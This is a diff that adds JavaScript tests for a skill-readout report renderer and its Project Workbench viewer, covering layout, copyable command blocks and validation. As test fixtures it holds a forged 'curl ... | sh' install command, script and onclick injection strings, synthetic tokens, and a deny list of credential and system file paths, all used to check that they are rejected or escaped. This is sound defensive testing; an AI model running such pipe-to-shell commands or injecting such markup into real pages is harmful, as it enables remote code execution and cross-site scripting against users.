@@ -23,6 +23,10 @@ import {
   renderReadoutProjectMetadata,
   renderReadoutSignalSummary,
 } from "../scripts/qs-skill-report-presentation.mjs";
+import {
+  renderDocumentationOutputContract,
+  renderSkillOutputContract,
+} from "../scripts/sync-skill-output-contracts.mjs";
 
 const quickStarkProject = Object.freeze({
   host: "github.com",
@@ -84,6 +88,693 @@ function verifiedGithubFixture({ total = 22, sampleSize = 8 } = {}) {
 
   return { fetcher, issues, requested, total };
 }
+
+test("module Visual Summary preserves complete boundary titles and categories across browser widths", async (context) => {
+  const decisions = [
+    { title: "Use a deep browser-visual delivery module with authenticated project-scoped URLs" },
+    { title: "Guide setup by harness before operating-system-specific producer installation" },
+    { title: "Expose privileged Settings through an independently isolated authentication boundary" },
+  ];
+  const findings = [
+    { title: "The visual website opened in VS Code instead of the authenticated web browser" },
+    { title: "Codex and ChatGPT share one authenticated, independently revocable reporting interface" },
+  ];
+  const browser = await chromium.launch({ headless: true });
+
+  context.after(async () => browser.close());
+
+  const page = await browser.newPage({ viewport: { width: 1440, height: 980 } });
+
+  await page.setContent(renderSkillReadout({
+    skill: "qs-design-modules",
+    outcome: "Record complete module boundaries and interfaces without hiding their meaning.",
+    decisions,
+    findings,
+  }), { waitUntil: "load" });
+
+  const summary = page.locator("figure.signal-panel");
+  const nodes = summary.locator("svg g");
+
+  assert.equal(await nodes.count(), 5, "all five actual observations remain visible in the module blueprint");
+
+  for (const [index, item] of [...decisions, ...findings].entries()) {
+    const node = nodes.nth(index);
+    const title = node.locator("text").first();
+    const category = node.locator("text").last();
+
+    assert.equal(
+      (await title.textContent()).replace(/\s+/g, " ").trim(),
+      item.title,
+      "the visual shows the complete recorded title rather than an ellipsis",
+    );
+    assert.equal(
+      (await category.textContent()).trim(),
+      index < decisions.length ? "Module boundaries" : "Interface observations",
+      "the observed category remains complete rather than colliding with its title",
+    );
+  }
+
+  for (const width of [1440, 760, 390]) {
+    await page.setViewportSize({ width, height: 980 });
+
+    const layout = await nodes.evaluateAll((elements) => elements.map((node) => {
+      const card = node.querySelector("rect").getBBox();
+
+      return Array.from(node.querySelectorAll("text"), (text) => {
+        const bounds = text.getBBox();
+
+        return {
+          insideLeft: bounds.x >= card.x - 1,
+          insideRight: bounds.x + bounds.width <= card.x + card.width + 1,
+          insideTop: bounds.y >= card.y - 1,
+          insideBottom: bounds.y + bounds.height <= card.y + card.height + 1,
+        };
+      });
+    }));
+
+    for (const node of layout) {
+      for (const text of node) {
+        assert.deepEqual(text, {
+          insideLeft: true,
+          insideRight: true,
+          insideTop: true,
+          insideBottom: true,
+        }, `complete module text stays inside its visual card at ${width}px`);
+      }
+    }
+
+    assert.equal(
+      await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
+      true,
+      `the complete visual remains responsive at ${width}px`,
+    );
+  }
+});
+
+test("actual skill readouts expose only recorded user-run commands and key code as copyable blocks", () => {
+  const command = {
+    title: "Install the updated QuickStark plugin",
+    command: "codex plugin add qs-skills@quickstark --json",
+    detail: "Run this in your terminal to install the independently verified plugin update.",
+  };
+  const keyCode = {
+    title: "Published Codex plugin version",
+    path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
+    language: "json",
+    code: '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}',
+    detail: "The installed plugin must use the same version as the verified release.",
+  };
+  const input = {
+    skill: "qs-code-build",
+    outcome: "Recorded the actual user installation command and versioned plugin manifest.",
+    commands: [command],
+    keyCode: [keyCode],
+  };
+  const report = normalizeSkillReadout(input);
+  const html = renderSkillReadout(input);
+
+  assert.equal(report.commands.length, 1);
+  assert.equal(report.commands[0].title, command.title);
+  assert.equal(report.commands[0].command, command.command);
+  assert.equal(report.commands[0].detail, command.detail);
+  assert.equal(report.commands[0].language, "bash");
+  assert.equal(report.keyCode.length, 1);
+  assert.equal(report.keyCode[0].title, keyCode.title);
+  assert.equal(report.keyCode[0].path, keyCode.path);
+  assert.equal(report.keyCode[0].language, "json");
+  assert.equal(report.keyCode[0].code, keyCode.code);
+  assert.match(html, /<h2>Commands to run<\/h2>/);
+  assert.match(html, /Run this in your terminal to install the independently verified plugin update\./);
+  assert.match(
+    html,
+    /<pre class="presentation-evidence-block"><code class="language-bash">codex plugin add qs-skills@quickstark --json<\/code><\/pre>/,
+  );
+  assert.match(html, /<h2>Key code<\/h2>/);
+  assert.match(html, /codex\/plugins\/qs-skills\/\.codex-plugin\/plugin\.json/);
+  assert.match(html, /<pre class="presentation-evidence-block"><code class="language-json">/);
+  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
+  assert.ok(
+    html.indexOf("<h2>Top next prompts</h2>") < html.indexOf("<h2>Commands to run</h2>"),
+    "native next prompts stay at the top before optional user-run commands",
+  );
+});
+
+test("top next prompts follow the visual summary before user actions and execution evidence", () => {
+  const html = renderSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Keep the next action above recorded commands, source, and changed files.",
+    execution: {
+      files: [{
+        path: "scripts/qs-skill-readout.mjs",
+        change: "modified",
+        summary: "Restore the approved prompt-first report layout.",
+      }],
+    },
+    provenance: {
+      commit: {
+        sha: "30b2e330c4a5cec64ad1052264b37d43b1736137",
+        published: false,
+      },
+    },
+    commands: [{
+      title: "Verify the report presentation",
+      command: "node --test tests/qs-report-presentation.test.mjs",
+      detail: "Run this in your terminal when you want to verify report presentation independently.",
+    }],
+    keyCode: [{
+      title: "Prompt-first report ordering",
+      path: "scripts/qs-skill-readout.mjs",
+      language: "javascript",
+      code: "${summary}\n${next}\n${actionableCode}\n${execution}",
+    }],
+  });
+  const summary = html.indexOf('<div class="presentation-summary-panel">');
+  const next = html.indexOf("<h2>Top next prompts</h2>");
+  const commands = html.indexOf("<h2>Commands to run</h2>");
+  const keyCode = html.indexOf("<h2>Key code</h2>");
+  const execution = html.indexOf("<h2>Execution context</h2>");
+  const delivery = html.indexOf("<h2>Verified delivery evidence</h2>");
+
+  for (const [label, position] of Object.entries({
+    summary,
+    next,
+    commands,
+    keyCode,
+    execution,
+    delivery,
+  })) {
+    assert.notEqual(position, -1, `${label} must be visible in the actual report`);
+  }
+
+  assert.ok(summary < next, "the five-second visual summary remains first");
+  assert.ok(next < commands, "recommended next prompts precede user-run commands");
+  assert.ok(commands < keyCode, "terminal instructions precede recorded key code");
+  assert.ok(keyCode < execution, "optional user actions precede the longer execution context");
+  assert.ok(execution < delivery, "verified delivery remains visible after execution context");
+});
+
+test("user-run terminal commands require an explanation and are never inferred from execution logs", () => {
+  assert.throws(() => normalizeSkillReadout({
+    skill: "qs-code-debug",
+    outcome: "Recorded a debugging command without explaining when the user should run it.",
+    commands: [{
+      title: "Debug the application",
+      command: "npm run debug",
+    }],
+  }), /commands\[0\]\.detail.*(?:why|when|explain)/i);
+
+  for (const skill of SKILLS) {
+    const completed = renderSkillReadout({
+      skill: skill.name,
+      outcome: `Recorded ${skill.displayName} without requiring a terminal action.`,
+      outputs: [{
+        title: "Skill executed its own verification",
+        detail: "npm test was executed by the skill; the user does not need to rerun it.",
+      }],
+      checks: [{
+        title: "npm test",
+        detail: "The skill already executed this check.",
+        status: "passed",
+      }],
+    });
+    const preview = renderSkillReadout({
+      skill: skill.name,
+      status: "Preview",
+      skillsUsed: [],
+      outcome: `Preview ${skill.displayName}; no actual command or code was recorded.`,
+    });
+
+    for (const [state, html] of [["completed", completed], ["preview", preview]]) {
+      assert.doesNotMatch(html, /<h2>Commands to run<\/h2>/, `${skill.name} ${state} cannot invent a terminal action`);
+      assert.doesNotMatch(html, /<h2>Key code<\/h2>/, `${skill.name} ${state} cannot invent a source excerpt`);
+      assert.doesNotMatch(html, /<meta name="quickstark:(?:user-command|key-code)"/, `${skill.name} ${state} cannot invent action metadata`);
+    }
+  }
+
+  assert.throws(() => normalizeSkillReadout({
+    skill: "qs-code-build",
+    status: "Preview",
+    skillsUsed: [],
+    outcome: "An unrun skill cannot claim an actual installation instruction.",
+    commands: [{
+      title: "Invented installation",
+      command: "npm install",
+      detail: "This action was not generated by any actual skill run.",
+    }],
+  }), /preview cannot claim.*commands/i);
+
+  assert.throws(() => normalizeSkillReadout({
+    skill: "qs-code-build",
+    status: "Preview",
+    skillsUsed: [],
+    outcome: "An unrun skill cannot claim actual project code.",
+    keyCode: [{
+      title: "Invented implementation",
+      code: "export const invented = true;",
+    }],
+  }), /preview cannot claim.*code/i);
+});
+
+test("all promoted skill contracts distinguish user-run commands and key code from execution logs", () => {
+  for (const skill of SKILLS) {
+    for (const [name, contract] of [
+      ["skill instructions", renderSkillOutputContract(skill)],
+      ["skill documentation", renderDocumentationOutputContract(skill)],
+    ]) {
+      assert.match(contract, /`commands`/, `${skill.name} ${name} documents optional user-run commands`);
+      assert.match(contract, /`keyCode`/, `${skill.name} ${name} documents optional recorded key code`);
+      assert.match(contract, /(?:why|when).{0,90}(?:run|terminal)|(?:run|terminal).{0,90}(?:why|when)/i, `${skill.name} ${name} explains when the user should run a command`);
+      assert.match(contract, /(?:already executed|execution logs|execution transcript)/i, `${skill.name} ${name} distinguishes user actions from the skill's completed work`);
+      assert.match(contract, /(?:credentials|secrets|private keys)/i, `${skill.name} ${name} protects sensitive content`);
+      assert.match(contract, /QS_READOUT_PRODUCER_TOKEN/, `${skill.name} ${name} keeps the producer credential privately configured`);
+      assert.match(contract, /reports\.quickstark\.com\/api\/v1\/readouts/, `${skill.name} ${name} identifies the default authenticated reports API`);
+      assert.match(contract, /(?:actual|current).{0,60}working directory/i, `${skill.name} ${name} derives reporting from the actual project`);
+      assert.match(contract, /(?:Git origin.{0,60}available|available.{0,60}Git origin|workspace.{0,90}(?:remote|origin)|(?:remote|origin).{0,90}workspace)/i, `${skill.name} ${name} supports ordinary workspaces with or without a Git remote`);
+      assert.match(contract, /(?:only|single).{0,60}(?:required|setting|credential|token)/i, `${skill.name} ${name} requires only a privately configured reporting token`);
+      assert.doesNotMatch(contract, /(?:configure|requires?|required).{0,140}QS_READOUT_(?:INGESTION_URL|PRODUCER_ID|PUBLISH_PROJECTS|HARNESS)/i, `${skill.name} ${name} must not require additional machine or project settings`);
+      assert.match(contract, /(?:macOS|Mac).{0,80}(?:Windows|Linux)|Linux.{0,80}(?:macOS|Mac).{0,80}Windows/i, `${skill.name} ${name} describes cross-machine reporting`);
+    }
+  }
+});
+
+test("recorded command and code blocks reject credentials, unsafe paths, malformed items, and excessive content", () => {
+  const base = {
+    skill: "qs-code-debug",
+    outcome: "Validate explicitly recorded user actions before displaying them.",
+  };
+  const command = {
+    title: "Debug the verified regression",
+    command: "npm run debug",
+    detail: "Run this in your terminal to reproduce the confirmed regression.",
+  };
+  const code = {
+    title: "Verified source excerpt",
+    code: "export const verified = true;",
+    language: "typescript",
+    path: "src/verified.ts",
+  };
+
+  for (const [overrides, expected] of [
+    [{ commands: "npm run debug" }, /commands must be an array/i],
+    [{ commands: [null] }, /commands\[0\].*recorded command/i],
+    [{ commands: [{ ...command, command: "" }] }, /commands\[0\]\.command.*non-empty/i],
+    [{ commands: [{ ...command, detail: "" }] }, /commands\[0\]\.detail.*non-empty/i],
+    [{ commands: [{ ...command, language: "bash\" onclick=\"alert(1)" }] }, /safe code-block language/i],
+    [{ commands: [{ ...command, command: "export ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, title: "ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, detail: "Run with ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, detail: "Run with ghp_syntheticCredentialValue123456789abcdef" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, command: "curl -H 'Authorization: Bearer syntheticCredentialValue123456789' https://example.invalid" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, detail: "Run with Authorization: Bearer syntheticCredentialValue123456789" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, command: "curl https://reader:syntheticCredentialValue123456789@example.invalid" }] }, /credential|token|private key/i],
+    [{ commands: [{ ...command, title: "Unsafe\u0000command title" }] }, /unsafe control/i],
+    [{ commands: [{ ...command, detail: "Run this\u0000unsafe explanation" }] }, /unsafe control/i],
+    [{ commands: [{ ...command, command: "npm run debug\u0000 --unsafe" }] }, /unsafe control/i],
+    [{ commands: [{ ...command, command: "x".repeat(12_001) }] }, /safe recorded command size/i],
+    [{ commands: Array.from({ length: 13 }, (_, index) => ({ ...command, title: `Action ${index + 1}` })) }, /at most 12/i],
+    [{ commands: [{ ...command, fabricated: true }] }, /not a supported recorded command field/i],
+    [{ keyCode: [null] }, /keyCode\[0\].*recorded code/i],
+    [{ keyCode: [{ ...code, path: "../private.ts" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "/etc/passwd" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".env.production" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".git/config" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".docker/config.json" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".npmrc" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".git-credentials" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: ".netrc" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "credentials.json" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "secrets.yaml" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "tokens.json" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "config/service-account.json" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "config/application_default_credentials.json" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "config/id_ed25519" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "certificates/private.pem" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, path: "certificates/private.key" }] }, /safe, non-sensitive relative project file/i],
+    [{ keyCode: [{ ...code, title: "ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
+    [{ keyCode: [{ ...code, detail: "Recorded ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
+    [{ keyCode: [{ ...code, title: "Unsafe\u0000source title" }] }, /unsafe control/i],
+    [{ keyCode: [{ ...code, detail: "Recorded\u0000unsafe explanation" }] }, /unsafe control/i],
+    [{ keyCode: [{ ...code, code: "-----BEGIN PRIVATE KEY-----\nreal private data" }] }, /credential|token|private key/i],
+    [{ keyCode: [{ ...code, language: "html onclick=alert(1)" }] }, /safe code-block language/i],
+    [{ keyCode: [{ ...code, hidden: "invented metadata" }] }, /not a supported recorded code field/i],
+  ]) {
+    assert.throws(() => normalizeSkillReadout({ ...base, ...overrides }), expected);
+  }
+});
+
+test("user-run commands and key code escape hostile markup without activating page content", () => {
+  const command = "printf '</code></pre><script>window.commandExecuted=true</script>'";
+  const code = "</code></pre><script>window.sourceExecuted=true</script>";
+  const html = renderSkillReadout({
+    skill: "qs-code-debug",
+    outcome: "Safely display observed terminal and source text.",
+    commands: [{
+      title: "Inspect </h3><script>window.titleExecuted=true</script>",
+      command,
+      detail: "Run this only when intentionally inspecting the recorded literal text.",
+    }],
+    keyCode: [{
+      title: "Recorded HTML boundary",
+      language: "html",
+      code,
+    }],
+  });
+
+  assert.match(html, /&lt;\/code&gt;&lt;\/pre&gt;&lt;script&gt;window\.commandExecuted=true&lt;\/script&gt;/);
+  assert.match(html, /&lt;\/code&gt;&lt;\/pre&gt;&lt;script&gt;window\.sourceExecuted=true&lt;\/script&gt;/);
+  assert.match(html, /Inspect &lt;\/h3&gt;&lt;script&gt;window\.titleExecuted=true&lt;\/script&gt;/);
+  assert.doesNotMatch(html, /<script\b/i);
+  assert.doesNotMatch(html, /onclick\s*=/i);
+});
+
+test("the Project Workbench preserves recorded user commands and key code without rewriting an immutable report", async (context) => {
+  const { directory, viewer } = await productionWorkbench(context);
+  const github = verifiedGithubFixture();
+  const command = "codex plugin add qs-skills@quickstark --json";
+  const snippet = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
+  const report = await writeSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Preserve an actionable installation command and the actual published plugin version.",
+    generatedAt: "2026-07-27T18:10:00.000Z",
+    projectIdentity: { ...quickStarkProject, source: "git-origin" },
+    commands: [{
+      title: "Install the updated plugin",
+      command,
+      detail: "Run this in your terminal when you want to load the published skill update.",
+    }],
+    keyCode: [{
+      title: "Published plugin manifest",
+      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
+      language: "json",
+      code: snippet,
+      detail: "Confirm the plugin version before installing it.",
+    }],
+  }, {
+    directory,
+    layout: "project",
+    cwd: process.cwd(),
+    githubFetcher: github.fetcher,
+  });
+  const original = await readFile(report.path, "utf8");
+  const parameters = new URLSearchParams({
+    project: quickStarkProject.key,
+    report: report.relativePath,
+  });
+  const response = await fetch(new URL(`?${parameters}`, viewer.url));
+  const html = await response.text();
+  const selected = html.match(
+    /<aside\b[^>]*aria-label="Selected skill readout"[^>]*>([\s\S]*?)<\/aside>/,
+  );
+
+  assert.equal(response.status, 200);
+  assert.match(original, /<meta name="quickstark:user-command" content=/);
+  assert.match(original, /<meta name="quickstark:key-code" content=/);
+  assert.ok(selected, "the complete immutable report remains in its selected Workbench pane");
+  assert.ok(
+    selected[1].indexOf('aria-label="Five-second report summary"')
+      < selected[1].indexOf("<h2>Top next prompts</h2>"),
+    "the immutable Workbench keeps its visual summary above recommended prompts",
+  );
+  assert.ok(
+    selected[1].indexOf("<h2>Top next prompts</h2>")
+      < selected[1].indexOf("<h2>Commands to run</h2>"),
+    "the immutable Workbench keeps recommended prompts above recorded terminal actions",
+  );
+  assert.ok(
+    selected[1].indexOf("<h2>Key code</h2>")
+      < selected[1].indexOf("<h2>Execution context</h2>"),
+    "the immutable Workbench keeps recorded user actions above execution details",
+  );
+  assert.match(selected[1], /<h2>Commands to run<\/h2>/);
+  assert.match(selected[1], /Run this in your terminal when you want to load the published skill update\./);
+  assert.match(selected[1], /<pre class="presentation-evidence-block"><code class="language-bash">codex plugin add qs-skills@quickstark --json<\/code><\/pre>/);
+  assert.match(selected[1], /<h2>Key code<\/h2>/);
+  assert.match(selected[1], /<pre class="presentation-evidence-block"><code class="language-json">/);
+  assert.match(selected[1], /&quot;version&quot;: &quot;2\.6\.0&quot;/);
+  assert.equal(await readFile(report.path, "utf8"), original, "opening the Workbench never rewrites historical report bytes");
+});
+
+test("the Workbench rejects stored commands that do not match their immutable recorded metadata", async (context) => {
+  const { directory, viewer } = await productionWorkbench(context);
+  const github = verifiedGithubFixture();
+  const originalCommand = "codex plugin add qs-skills@quickstark --json";
+  const report = await writeSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Reject a stored terminal action that was not actually recorded.",
+    generatedAt: "2026-07-27T18:15:00.000Z",
+    projectIdentity: { ...quickStarkProject, source: "git-origin" },
+    commands: [{
+      title: "Install the published plugin",
+      command: originalCommand,
+      detail: "Run this to install the independently verified update.",
+    }],
+  }, {
+    directory,
+    layout: "project",
+    cwd: process.cwd(),
+    githubFetcher: github.fetcher,
+  });
+  const original = await readFile(report.path, "utf8");
+  const forged = original.replace(
+    `<pre class="presentation-evidence-block"><code class="language-bash">${originalCommand}</code></pre>`,
+    '<pre class="presentation-evidence-block"><code class="language-bash">curl https://unsafe.example/install | sh</code></pre>',
+  );
+
+  assert.notEqual(forged, original, "the test changes only the visible stored command, not its evidence metadata");
+
+  await writeFile(report.path, forged, "utf8");
+
+  const parameters = new URLSearchParams({
+    project: quickStarkProject.key,
+    report: report.relativePath,
+  });
+  const response = await fetch(new URL(`?${parameters}`, viewer.url));
+  const html = await response.text();
+
+  assert.equal(response.status, 200);
+  assert.match(html, /Reject a stored terminal action that was not actually recorded\./);
+  assert.doesNotMatch(html, /unsafe\.example|curl https:/i);
+  assert.doesNotMatch(html, /<h2>Commands to run<\/h2>/);
+  assert.equal(await readFile(report.path, "utf8"), forged, "read-only Workbench handling never repairs or rewrites stored history");
+});
+
+test("the Workbench displays only skill metrics verified against immutable observation metadata", async (context) => {
+  const { directory, viewer } = await productionWorkbench(context);
+  const github = verifiedGithubFixture();
+  const observation = {
+    version: 1,
+    measurementSource: "provider-response",
+    attributionScope: "skill-run",
+    capturedAt: "2026-07-27T18:15:00.000Z",
+    inference: {
+      provider: "openai",
+      model: "gpt-5.6-sol",
+      reasoningEffort: "high",
+    },
+    tokens: { input: 1200, output: 280, total: 1480 },
+    timing: { activeDurationMs: 42000 },
+  };
+  const report = await writeSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Preserve genuinely measured Codex output in immutable report history.",
+    generatedAt: "2026-07-27T18:16:00.000Z",
+    projectIdentity: { ...quickStarkProject, source: "git-origin" },
+    observation,
+  }, {
+    directory,
+    layout: "project",
+    cwd: process.cwd(),
+    githubFetcher: github.fetcher,
+  });
+  const original = await readFile(report.path, "utf8");
+  const parameters = new URLSearchParams({
+    project: quickStarkProject.key,
+    report: report.relativePath,
+  });
+  const originalResponse = await fetch(new URL(`?${parameters}`, viewer.url));
+  const originalWorkbench = await originalResponse.text();
+
+  assert.equal(originalResponse.status, 200);
+  assert.match(originalWorkbench, /<h2>Skill run metrics<\/h2>/);
+  assert.match(originalWorkbench, /gpt-5\.6-sol/);
+  assert.match(originalWorkbench, /1,480/);
+  assert.match(originalWorkbench, /42,000 ms/);
+  assert.equal(await readFile(report.path, "utf8"), original);
+
+  const forged = original.replace(
+    '<article class="presentation-run-metric"><span>MODEL</span><strong>gpt-5.6-sol</strong></article>',
+    '<article class="presentation-run-metric"><span>MODEL</span><strong>fabricated-provider-model</strong></article>',
+  );
+
+  assert.notEqual(forged, original, "the test changes visible metrics without changing immutable observation metadata");
+
+  await writeFile(report.path, forged, "utf8");
+
+  const forgedResponse = await fetch(new URL(`?${parameters}`, viewer.url));
+  const forgedWorkbench = await forgedResponse.text();
+
+  assert.equal(forgedResponse.status, 200);
+  assert.doesNotMatch(forgedWorkbench, /fabricated-provider-model/);
+  assert.doesNotMatch(forgedWorkbench, /<h2>Skill run metrics<\/h2>/);
+  assert.equal(await readFile(report.path, "utf8"), forged, "the Workbench never rewrites an immutable historical report");
+});
+
+test("actual Chromium renders verified Codex metrics as responsive top-of-report cards", async (context) => {
+  const browser = await chromium.launch({ headless: true });
+
+  context.after(async () => browser.close());
+
+  const page = await browser.newPage({ viewport: { width: 1200, height: 1000 } });
+
+  await page.setContent(renderSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Show the independently observed Codex metrics without moving recommended next actions.",
+    observation: {
+      version: 1,
+      measurementSource: "provider-response",
+      attributionScope: "skill-run",
+      capturedAt: "2026-07-27T18:15:00.000Z",
+      inference: {
+        provider: "openai",
+        model: "gpt-5.6-sol",
+        reasoningEffort: "high",
+      },
+      tokens: { input: 1200, output: 280, total: 1480 },
+      timing: { activeDurationMs: 42000 },
+    },
+  }), { waitUntil: "load" });
+
+  const section = page.getByRole("heading", { name: "Skill run metrics" })
+    .locator("xpath=ancestor::section");
+  const cards = section.locator("article.presentation-run-metric");
+  const next = await page.getByRole("heading", { name: "Top next prompts" }).boundingBox();
+  const metrics = await page.getByRole("heading", { name: "Skill run metrics" }).boundingBox();
+  const execution = await page.getByRole("heading", { name: "Execution context" }).boundingBox();
+
+  assert.ok(next && metrics && execution);
+  assert.ok(next.y < metrics.y && metrics.y < execution.y, "actual run metrics stay between top next prompts and execution details");
+  assert.equal(await cards.count(), 6);
+  assert.deepEqual(await cards.locator("strong").allTextContents(), [
+    "gpt-5.6-sol", "high", "1,200", "280", "1,480", "42,000 ms",
+  ]);
+  assert.equal(
+    await cards.first().locator("strong").evaluate((element) => getComputedStyle(element).fontSize),
+    "13px",
+    "recorded Codex metric values use the approved readable 13 px feature typography",
+  );
+
+  const positions = async () => cards.evaluateAll((elements) => elements.map((element) => {
+    const bounds = element.getBoundingClientRect();
+
+    return { top: bounds.top, bottom: bounds.bottom };
+  }));
+  const desktop = await positions();
+
+  assert.ok(desktop.every((card) => Math.abs(card.top - desktop[0].top) <= 1), "all six metrics share one aligned desktop row");
+
+  await page.setViewportSize({ width: 1040, height: 1000 });
+
+  const tablet = await positions();
+
+  assert.ok(tablet.slice(0, 3).every((card) => Math.abs(card.top - tablet[0].top) <= 1));
+  assert.ok(tablet[3].top > tablet[0].bottom, "metrics wrap into two clean tablet rows");
+
+  await page.setViewportSize({ width: 420, height: 900 });
+
+  const mobile = await positions();
+
+  assert.ok(Math.abs(mobile[0].top - mobile[1].top) <= 1);
+  assert.ok(mobile[2].top > mobile[0].bottom, "metrics render in a readable two-column mobile layout");
+  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
+});
+
+test("actual Chromium renders responsive 12 px user-run commands and complete key code blocks", async (context) => {
+  const commands = [{
+    title: "Install the released QuickStark skills",
+    command: "codex plugin add qs-skills@quickstark --json",
+    detail: "Run this in your terminal to install the published plugin.",
+  }, {
+    title: "Debug the production report",
+    command: "node --test --test-name-pattern='recorded user-run commands and key code' tests/qs-report-presentation.test.mjs",
+    detail: "Run this only when you need to reproduce the specific report presentation behavior.",
+  }];
+  const snippet = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
+  const browser = await chromium.launch({ headless: true });
+
+  context.after(async () => browser.close());
+
+  const page = await browser.newPage({
+    viewport: { width: 1200, height: 1000 },
+  });
+
+  await page.setContent(renderSkillReadout({
+    skill: "qs-code-build",
+    outcome: "Provide actual install and debugging instructions with the published manifest.",
+    commands,
+    keyCode: [{
+      title: "Published plugin version",
+      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
+      language: "json",
+      code: snippet,
+    }],
+  }), { waitUntil: "load" });
+
+  const commandSection = page.getByRole("heading", { name: "Commands to run" })
+    .locator("xpath=ancestor::section");
+  const codeSection = page.getByRole("heading", { name: "Key code" })
+    .locator("xpath=ancestor::section");
+  const commandCards = commandSection.locator("article.presentation-evidence-card");
+  const summaryBounds = await page.locator(".presentation-summary-panel").boundingBox();
+  const nextBounds = await page.getByRole("heading", { name: "Top next prompts" }).boundingBox();
+  const commandBounds = await page.getByRole("heading", { name: "Commands to run" }).boundingBox();
+  const executionBounds = await page.getByRole("heading", { name: "Execution context" }).boundingBox();
+
+  assert.ok(summaryBounds && nextBounds && commandBounds && executionBounds);
+  assert.ok(
+    nextBounds.y >= summaryBounds.y + summaryBounds.height - 1,
+    "the browser renders the recommended prompts immediately below the visual summary",
+  );
+  assert.ok(nextBounds.y < commandBounds.y, "recommended prompts remain above user-run commands");
+  assert.ok(commandBounds.y < executionBounds.y, "recorded user actions remain above execution details");
+  assert.equal(await commandCards.count(), 2);
+
+  for (const [index, item] of commands.entries()) {
+    const block = commandCards.nth(index).locator("pre code");
+
+    assert.equal(await block.textContent(), item.command, "the complete terminal command is copyable");
+    assert.equal(await block.evaluate((element) => getComputedStyle(element).fontSize), "12px");
+    assert.equal(await commandCards.nth(index).getByText(item.detail, { exact: true }).count(), 1);
+  }
+
+  const code = codeSection.locator("pre code");
+
+  assert.equal(await code.textContent(), snippet, "the complete recorded code remains copyable");
+  assert.equal(await code.evaluate((element) => getComputedStyle(element).fontSize), "12px");
+
+  const desktop = await commandCards.evaluateAll((elements) => elements.map((element) => {
+    const bounds = element.getBoundingClientRect();
+
+    return { top: bounds.top, bottom: bounds.bottom };
+  }));
+
+  assert.ok(Math.abs(desktop[0].top - desktop[1].top) <= 1, "terminal actions share an aligned desktop row");
+  assert.ok(Math.abs(desktop[0].bottom - desktop[1].bottom) <= 1, "unequal explanations keep equal desktop card heights");
+
+  await page.setViewportSize({ width: 420, height: 900 });
+
+  const mobile = await commandCards.evaluateAll((elements) => elements.map((element) => {
+    const bounds = element.getBoundingClientRect();
+
+    return { top: bounds.top, bottom: bounds.bottom };
+  }));
+
+  assert.ok(mobile[1].top > mobile[0].bottom, "user commands stack on narrow screens");
+  assert.equal(
+    await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
+    true,
+    "a long, copyable command scrolls inside its block without overflowing the report",
+  );
+});
 
 test("the five-second report summary features a recorded P0 before an earlier P1 finding", () => {
   const html = renderSkillReadout({
